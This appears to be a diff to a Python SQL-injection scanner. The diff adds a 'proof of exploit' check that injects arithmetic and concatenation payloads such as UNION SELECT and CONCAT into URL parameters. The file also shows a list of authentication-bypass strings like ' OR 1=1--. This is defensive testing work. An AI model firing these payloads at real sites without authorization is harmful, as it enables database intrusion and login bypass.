@@ -1,3 +1,4 @@
+import random
 import re
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -73,6 +74,99 @@ def is_waf_blocking_page(status_code: int, body: str, headers: Any = None) -> bo
     )
 
 
+def test_poe_sqli(
+    parsed: Any,
+    params: dict[str, list[str]],
+    param: str,
+    baseline_body: str = "",
+    session: Optional[requests.Session] = None,
+) -> Optional[dict[str, str]]:
+    """
+    Verificación por Prueba de Explotación (PoE) Matemática (Patrón Invicti / Netsparker).
+    Inyecta expresiones de evaluación aritmética y concatenación de cadenas deterministas.
+    Si la base de datos devuelve el resultado exacto computado que no existía en la respuesta base,
+    certifica la vulnerabilidad con 100% de certeza matemática y cero falsos positivos.
+    """
+    client = session if session is not None else requests
+
+    # 1. Prueba de evaluación aritmética: n1 + n2 = expected_sum
+    n1 = random.randint(31000, 79000)
+    n2 = random.randint(11000, 20000)
+    expected_sum = str(n1 + n2)
+
+    # Si la suma ya existía de antemano en la respuesta base, descartar para evitar falsos positivos
+    if expected_sum in baseline_body:
+        return None
+
+    arithmetic_candidates = [
+        f"{n1}+{n2}",
+        f"-1 UNION SELECT {n1}+{n2}",
+        f"1 UNION SELECT {n1}+{n2}",
+        f"-1' UNION SELECT {n1}+{n2}--",
+        f"1' UNION SELECT {n1}+{n2}--",
+        f"-1 UNION SELECT NULL,{n1}+{n2},NULL--",
+        f"1' AND {n1}+{n2}={expected_sum}--",
+    ]
+
+    for payload in arithmetic_candidates:
+        test_params = params.copy()
+        test_params[param] = [payload]
+        new_query = urlencode(test_params, doseq=True)
+        test_url = urlunparse(parsed._replace(query=new_query))
+        try:
+            r = client.get(test_url, timeout=5)
+            if r.status_code == 200 and expected_sum in r.text and expected_sum not in baseline_body:
+                if f"{n1}+{n2}" not in r.text or expected_sum != f"{n1}+{n2}":
+                    return {
+                        "vuln": f"SQL Injection Confirmado con Prueba de Explotación (PoE) en '{param}'",
+                        "risk": "Crítico",
+                        "detail": (
+                            f"Proof of Exploit (PoE) matemático verificado: la base de datos evaluó la expresión SQL "
+                            f"'{payload}' y devolvió el resultado computado exacto '{expected_sum}' en la respuesta HTTP."
+                        ),
+                        "confidence": "confirmed",
+                        "proof_of_exploit": f"Expresión: {payload} -> Resultado computado: {expected_sum}",
+                    }
+        except requests.RequestException:
+            continue
+
+    # 2. Prueba de concatenación de cadenas determinista: 'om' + 'ni<nonce>' = 'omni<nonce>'
+    nonce = str(random.randint(100, 999))
+    t1 = "om"
+    t2 = f"ni{nonce}"
+    expected_concat = f"{t1}{t2}"
+    if expected_concat in baseline_body:
+        return None
+
+    concat_candidates = [
+        f"'{t1}'||'{t2}'",  # SQLite, PostgreSQL, Oracle
+        f"CONCAT('{t1}','{t2}')",  # MySQL, MariaDB
+        f"'{t1}'+'{t2}'",  # MSSQL
+    ]
+    for payload in concat_candidates:
+        test_params = params.copy()
+        test_params[param] = [payload]
+        new_query = urlencode(test_params, doseq=True)
+        test_url = urlunparse(parsed._replace(query=new_query))
+        try:
+            r = client.get(test_url, timeout=5)
+            if r.status_code == 200 and expected_concat in r.text and expected_concat not in baseline_body:
+                return {
+                    "vuln": f"SQL Injection Confirmado con Prueba de Explotación (PoE) en '{param}'",
+                    "risk": "Crítico",
+                    "detail": (
+                        f"Proof of Exploit (PoE) de concatenación verificado: la base de datos evaluó la expresión "
+                        f"'{payload}' y devolvió el resultado concatenado '{expected_concat}'."
+                    ),
+                    "confidence": "confirmed",
+                    "proof_of_exploit": f"Expresión: {payload} -> Resultado concatenado: {expected_concat}",
+                }
+        except requests.RequestException:
+            continue
+
+    return None
+
+
 def test_error_sqli(
     parsed: Any, params: dict[str, list[str]], param: str, payload: str, baseline_body: str = "", session: Optional[requests.Session] = None
 ) -> Optional[dict[str, str]]:
@@ -104,6 +198,7 @@ def test_error_sqli(
     except requests.RequestException:
         pass
     return None
+
 
 def test_time_sqli(
     parsed: Any,
@@ -214,6 +309,7 @@ def test_boolean_sqli(
 
 AUTH_BYPASS_PAYLOADS: list[str] = ["' OR 1=1--", "' OR '1'='1", "admin'--", "') OR ('1'='1--"]
 
+
 def test_json_sqli(
     url: str,
     session: Optional[requests.Session] = None,
@@ -283,6 +379,7 @@ def test_json_sqli(
 
     return results
 
+
 def check_sqli(
     url: str,
     session: Optional[requests.Session] = None,
@@ -313,21 +410,20 @@ def check_sqli(
     tasks: list[tuple[str, str, Any]] = []
 
     for param in params:
+        tasks.append(("poe", param, None))
         for payload in ERROR_PAYLOADS:
             tasks.append(("error", param, payload))
-
-    for param in params:
         for true_p, false_p in BOOLEAN_PAIRS:
             tasks.append(("boolean", param, (true_p, false_p)))
-
-    for param in params:
         for payload in TIME_PAYLOADS:
             tasks.append(("time", param, payload))
 
     with ThreadPoolExecutor(max_workers=10) as executor:
         futures = {}
         for task_type, param, payload in tasks:
-            if task_type == "error":
+            if task_type == "poe":
+                fut = executor.submit(test_poe_sqli, parsed, params, param, baseline_body, session)
+            elif task_type == "error":
                 fut = executor.submit(test_error_sqli, parsed, params, param, str(payload), baseline_body, session)
             elif task_type == "boolean" and isinstance(payload, tuple):
                 fut = executor.submit(test_boolean_sqli, parsed, params, param, payload[0], payload[1], baseline_body, session)
